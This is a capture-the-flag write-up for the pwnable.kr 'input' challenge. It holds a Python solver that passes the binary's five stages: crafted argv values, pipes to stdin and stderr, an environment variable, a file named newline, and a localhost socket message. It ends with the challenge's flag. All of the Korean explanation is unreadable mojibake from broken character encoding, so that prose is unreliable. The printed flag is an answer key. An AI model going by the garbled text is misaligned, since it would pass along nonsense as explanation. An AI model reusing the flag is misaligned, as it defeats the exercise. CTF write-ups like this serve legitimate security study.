# input

**Category:** Pwnable

**Source:** pwnable.kr

**Points:** 40

**Author:** Jisoon Park(js00n.park)

**Description:** 

> Mom? how can I pass my input to a computer program?

## Write-up

input ������ Ư���� ���� ������� ���� ������ �ƴϴ�.<br>
�ҽ� �ڵ带 ����, ���̳ʸ��� �پ��� ������� �Է��� �ִ� ����� ���� ������ ���� �ִ� ���� �� �� �ִ�.

![wiki](resource/code.png)

�� �ټ����� stage�� �����ϸ� flag ���� �ְ� �Ǿ� �ִµ�, <br>
exploit�� C�� ������ ��� �� �� �������� stage�� ������<br>
������ ������ Ǯ������� python�� �ͼ������� ������ �ʿ��ϴ�<br>
���� ��ƴ��� python�� �̿��ؼ� ������ Ǯ��⸦ ��õ�Ѵ�.

����� ������ �ƴ� �����, �� stage�� ������ �������� �ʰ� ���� �ذ��� ���� �ڵ带 ÷���Ѵ�.

```python
import subprocess
import os, sys, struct
import socket, time

#stage 1
cmd = ["/home/input2/input"];

for i in range(99):
	cmd = cmd + ["A"];
cmd[65] = "";
cmd[66] = "\x20\x0a\x0d";
cmd[67] = "25009";

#stage 2: creat pipe
(r0, w0) = os.pipe();
(r2, w2) = os.pipe();

#stage 3 
my_env = os.environ.copy();
my_env["\xde\xad\xbe\xef"] = "\xca\xfe\xba\xbe";

#stage 4
f = open("\x0a", "w");
f.write("\x00\x00\x00\x00");
f.close();

#launch command
p = subprocess.Popen(cmd, stdin=r0, stderr=r2, env=my_env);

#stage 2: send message by pipe
os.write(w0, buffer("\x00\x0a\x00\xff"));
os.close(r0);
os.close(w0);

os.write(w2, buffer("\x00\x0a\x02\xff"));
os.close(r2);
os.close(w2);

#stage 5
time.sleep(1);			#give time to perpare server socket
host="127.0.0.1";
port=25009;
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
try:
	s.connect((host, port));

	s.send(buffer("\xde\xad\xbe\xef"));
	s.close();
except Exception as e:
	print('Connection failed to server ' + host);

time.sleep(1);
p.poll();
```

/tmp ���丮�� ������ ���丮�� �����Ͽ� �� �ڵ带 �ְ�, flag�� symbolic link�� �� �� �����ϸ�<br>
flag�� ���� �� �ִ�.

![wiki](resource/run.png)

Flag : <b>Mommy! I learned how to pass various input in Linux :)</b>
